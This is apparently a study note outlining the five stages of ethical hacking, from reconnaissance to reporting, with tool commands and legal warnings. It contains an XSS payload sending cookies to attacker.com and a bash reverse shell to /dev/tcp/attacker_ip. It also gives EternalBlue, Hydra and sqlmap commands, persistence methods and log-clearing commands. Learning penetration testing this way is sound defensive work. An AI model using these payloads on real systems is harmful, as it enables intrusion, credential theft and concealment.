---
tags: [cybersecurity, ethical-hacking, pentesting, methodology]
---

# 🛡️ 5 Stages of Ethical Hacking

> [!info] What is Ethical Hacking?
> Ethical hacking (also called **penetration testing** or **white-hat hacking**) is the authorized practice of probing systems, networks, and applications for vulnerabilities — before malicious hackers find them. Every professional pentest follows a structured methodology to stay legal, thorough, and repeatable.

---

## Overview

```
Stage 1 → Reconnaissance   (gather information)
Stage 2 → Scanning         (find the attack surface)
Stage 3 → Gaining Access   (exploit vulnerabilities)
Stage 4 → Maintaining Access (persistence)
Stage 5 → Covering Tracks  (cleanup / reporting)
```

---

## Stage 1 — Reconnaissance (Information Gathering)

> [!question] Goal
> Collect as much information as possible about the target **without touching it directly**. This is purely research — no scanning, no probing.

Also called **footprinting**. The more you know before you attack, the more targeted and effective your later stages are.

### Two Types

| Type | Description | Example |
|---|---|---|
| **Passive** | Gather info without interacting with the target at all | Google dorking, WHOIS, LinkedIn, Shodan |
| **Active** | Interact with the target directly to gather info | Ping, traceroute, DNS queries |

> [!note] Passive recon leaves no logs on the target. Active recon may leave traces.

### What You're Looking For

- Domain names, subdomains, IP ranges
- Email addresses and employee names
- Technologies and software versions in use
- Open job postings (reveal internal tech stack)
- Social media footprint
- Physical location, office details

### Tools & Techniques

```bash
# WHOIS — domain registration info
whois target.com

# DNS enumeration
dig target.com ANY
dnsrecon -d target.com
sublist3r -d target.com          # passive subdomain discovery

# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
"target.com" intitle:"index of"

# Shodan (search engine for internet-facing devices)
# shodan.io → search "apache target.com"

# Email harvesting
theHarvester -d target.com -b google

# Tech stack fingerprinting
whatweb http://target.com
```

### Deliverable
A **target profile**: IP ranges, subdomains, tech stack, employee emails, key entry points to investigate in the next stage.

---

## Stage 2 — Scanning & Enumeration

> [!question] Goal
> Actively probe the target to map its attack surface — open ports, running services, OS versions, users, shares, and known vulnerabilities.

This is where you go from "what do they have?" to "what are they running and is it vulnerable?"

### Three Layers of Scanning

| Layer | What you're finding | Tools |
|---|---|---|
| **Network scanning** | Live hosts, open ports, IP topology | nmap, masscan |
| **Vulnerability scanning** | Known CVEs and misconfigurations | Nikto, OpenVAS, Nessus |
| **Enumeration** | Usernames, shares, services, OS details | enum4linux, smbclient, snmpwalk |

### Nmap — Core Scanning Tool

```bash
# Host discovery — who's alive?
nmap -sn 192.168.1.0/24

# Quick scan — top 1000 ports
nmap -T4 target.com

# Full port scan + service + version detection
nmap -sS -sV -sC -p- -T4 target.com -oA scan_results

# OS detection
nmap -O target.com

# Vuln scripts
nmap --script=vuln target.com

# Specific service checks
nmap --script=smb-vuln-ms17-010 target.com   # EternalBlue
nmap --script=ftp-anon target.com             # anonymous FTP
```

### Enumeration by Service

```bash
# SMB (port 445)
enum4linux -a target.com
smbclient -L //target.com -N

# SNMP (port 161)
snmpwalk -c public -v2c target.com

# Web (port 80/443)
nikto -h http://target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# DNS zone transfer
dig axfr @ns.target.com target.com
```

### Deliverable
A **vulnerability map**: list of open ports, service versions, identified CVEs, misconfigurations, and prioritized attack vectors.

---

## Stage 3 — Gaining Access (Exploitation)

> [!question] Goal
> Use the vulnerabilities found in Stage 2 to actually get into the system — whether that's a shell, a database, admin panel access, or a foothold in the network.

This is the stage most people think of when they hear "hacking." In reality, it comes only after thorough recon and scanning.

### Common Attack Vectors

| Vector | Description | Example |
|---|---|---|
| **Exploit known CVE** | Use a public exploit for a vulnerable software version | EternalBlue on unpatched SMB |
| **Weak / default credentials** | Brute force or guess credentials | `admin:admin` on a router |
| **SQL Injection** | Inject SQL through a web form to dump the database | `' OR 1=1 --` |
| **Cross-Site Scripting (XSS)** | Inject JavaScript to steal session cookies | `<script>document.location='attacker.com?c='+document.cookie</script>` |
| **File upload bypass** | Upload a reverse shell disguised as an image | `.php` shell renamed to `.jpg` |
| **Phishing** | Trick a user into giving credentials or running a payload | Fake login page |
| **Password cracking** | Crack a captured hash offline | hashcat + rockyou.txt |
| **Buffer overflow** | Overflow memory to execute arbitrary code | Classic binary exploitation |

### Tools

```bash
# Metasploit Framework — exploit framework
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
run

# Hydra — brute force login
hydra -l admin -P rockyou.txt ssh://target.com
hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# SQLMap — automated SQL injection
sqlmap -u "http://target.com/item?id=1" --dbs --batch

# Reverse shell (after getting code execution)
# Attacker: listen
nc -lvnp 4444
# Victim (bash reverse shell):
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

### What Success Looks Like

- A shell on the target machine (reverse shell, bind shell)
- Database access (credentials, sensitive data)
- Admin panel access
- A foothold to pivot deeper into the network

> [!warning] Always stay within scope
> Gaining access outside your authorized scope — even accidentally — is illegal. Keep your target list visible and stick to it.

### Deliverable
Documented proof of exploitation: **screenshots, command output, shells obtained, data accessed** (without exfiltrating real sensitive data).

---

## Stage 4 — Maintaining Access (Persistence)

> [!question] Goal
> Simulate what a real attacker would do after getting in — establish persistence so they can return even if the initial vulnerability is patched. Also used to pivot deeper into the network.

In a real pentest, this stage demonstrates to the client **how much damage** a real attacker could do if they weren't detected immediately.

### Persistence Techniques

| Technique | Description |
|---|---|
| **Backdoor / RAT** | Install a Remote Access Trojan or reverse shell that starts on boot |
| **SSH key injection** | Add attacker's public key to `~/.ssh/authorized_keys` |
| **Cron job** | Add a cron job that reconnects the reverse shell periodically |
| **New user account** | Create a hidden admin account |
| **Rootkit** | Modify OS to hide the attacker's presence (advanced) |
| **Scheduled Task (Windows)** | `schtasks` to run payload on schedule |
| **Registry Run Key (Windows)** | Add payload to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |

### Pivoting (Moving Laterally)

Once inside one machine, a real attacker uses it as a launchpad to reach other systems on the internal network that weren't accessible from the outside.

```bash
# See what other networks/IPs the compromised machine can reach
ip a
ip route
arp -a

# SSH tunneling (use compromised machine as a jump host)
ssh -L 3306:internal_db:3306 user@compromised_host

# SOCKS proxy through compromised host
ssh -D 9050 user@compromised_host
# Then point tools through proxychains
proxychains nmap -sT internal_target
```

### Privilege Escalation

After gaining access, you often start with a low-privilege shell. Privesc gets you to `root` or `SYSTEM`.

```bash
# Linux — what can I run as sudo?
sudo -l

# Search for SUID binaries (run as root)
find / -perm -4000 -type f 2>/dev/null

# Check for world-writable cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Common reference: GTFOBins (gtfobins.github.io)
# Lists how to abuse common Linux binaries for privesc

# Windows — check privileges
whoami /priv
# Reference: LOLBAS (lolbas-project.github.io)
```

### Deliverable
Documentation of **persistence mechanisms planted** and **lateral movement paths** discovered — this tells the client exactly what an attacker could access if they maintained a foothold undetected.

---

## Stage 5 — Covering Tracks (Reporting)

> [!question] Goal
> In a real attack, this stage is where the attacker erases evidence of their presence. In ethical hacking, this stage is about **cleaning up everything you planted** and delivering a comprehensive report to the client.

> [!warning] Important distinction
> Real attackers delete logs to avoid detection. Ethical hackers **document everything** and then clean up their tools/backdoors. The deliverable is a report, not invisibility.

### What Real Attackers Do (for your understanding)

| Action | What it achieves |
|---|---|
| Clear bash history | `history -c`, `unset HISTFILE` |
| Clear log files | `/var/log/auth.log`, `/var/log/syslog` |
| Modify timestamps | `touch -t [timestamp] file` (timestomping) |
| Delete created accounts | Remove the backdoor user |
| Kill reverse shell connections | Remove persistence mechanisms |

### What Ethical Hackers Do

1. **Remove all backdoors and planted tools** from target systems
2. **Restore any modified files** to their original state
3. **Document every action taken** (commands run, exploits used, files modified)
4. **Write the penetration test report**

### The Pentest Report — What It Contains

```
1. Executive Summary
   - High-level findings for non-technical stakeholders
   - Overall risk rating (Critical / High / Medium / Low)
   - Top 3 most impactful vulnerabilities

2. Scope & Methodology
   - What systems were tested
   - Dates and time windows
   - Testing approach used

3. Findings (one entry per vulnerability)
   - Vulnerability name
   - Severity (CVSS score)
   - Affected system / component
   - Description and proof (screenshot / output)
   - Business impact
   - Recommended fix

4. Remediation Roadmap
   - Prioritized fix list
   - Quick wins vs. long-term hardening

5. Appendix
   - Raw scan output
   - Full command log
   - Tool versions used
```

### Deliverable
The **penetration test report** — the main output of the entire engagement. A good report is what clients pay for. A shell with no documentation has no value.

---

## Full Methodology at a Glance

| Stage | Also Called | Key Question | Output |
|---|---|---|---|
| 1. Reconnaissance | Footprinting | What do I know about the target? | Target profile |
| 2. Scanning | Enumeration | What is running and what's vulnerable? | Vulnerability map |
| 3. Gaining Access | Exploitation | Can I get in? | Proof of exploitation |
| 4. Maintaining Access | Persistence / Post-exploitation | How deep can I go? | Lateral movement map |
| 5. Covering Tracks | Reporting | What did I find and how do we fix it? | Pentest report |

---

## Legal & Ethical Rules — Always

> [!warning] Non-negotiable
> - **Written authorization** before any testing — verbal permission is not enough
> - **Defined scope** — only test what is explicitly listed in the scope document
> - **Never access or exfiltrate real user data** — document access without downloading
> - **Report critical vulnerabilities immediately** — don't wait for the final report if you find something dangerous
> - **Clean up completely** — leave the system exactly as you found it, minus the vulnerabilities you've documented

---

## Where This Fits in CTFs vs. Real Pentests

| Aspect | CTF | Real Pentest |
|---|---|---|
| Recon | Minimal — scope is the box | Extensive — subdomains, OSINT, employees |
| Scanning | Nmap the box | Broad network sweep + web crawl |
| Exploitation | Find the intended vulnerability | Exploit all found vulnerabilities |
| Persistence | Usually not required | Demonstrate and document |
| Reporting | Write-up (post-competition) | Full formal report (mandatory) |

---

## Related Notes

- [[05_Nmap_and_Recon]] — detailed scanning reference
- [[04_Ports_and_Services]] — what open ports tell you
- [[07_Network_Attacks]] — attack types reference
- [[02_Protocols]] — protocol-specific vulnerabilities
